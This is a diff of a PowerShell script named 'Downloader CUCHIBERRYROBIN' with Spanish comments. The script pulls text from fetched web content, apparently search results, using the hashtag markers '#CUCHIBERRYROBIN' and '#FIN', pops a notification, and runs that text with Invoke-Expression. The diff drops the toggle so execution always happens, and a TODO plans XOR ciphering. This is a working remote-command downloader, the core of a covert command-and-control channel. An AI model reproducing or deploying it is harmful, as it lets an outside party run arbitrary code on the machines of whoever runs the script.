@@ -1,10 +1,4 @@
-﻿
-
-
 #Downloader CUCHIBERRYROBIN
-
-$Conf_Ballon=$True
-
 $Conf_Hashtag_init="#CUCHIBERRYROBIN"
 $Conf_Hashtag_end="#FIN"
 
@@ -14,7 +8,7 @@ $patron = '(?<=$Conf_Hashtag_init )(.*)(?= $Conf_Hashtag_end)'
 $resultado = [regex]::Match($content.Content, $patron).Value
 
 #Bun BING WORKS!!!
-
+#Pero OPCION #TODO CIPHER XOR
 if (([string]::IsNullOrEmpty($resultado)))
 {
 $conf_hashtag_init_encoded = [System.Uri]::EscapeDataString($Conf_Hashtag_init)
@@ -35,9 +29,6 @@ $resultado = [regex]::Match($content, $patron).Value
 
 
 
-if ($Conf_Ballon -eq $True) {
-
-
 $Title = "CuchiBerryRObin"
 $Message = "Descargando comando $resultado"
 $Type = "info" 
@@ -50,6 +41,6 @@ $notify.icon = $icon
 $notify.visible = $true
 $notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)
 Invoke-Expression $resultado
-}
+
 
 
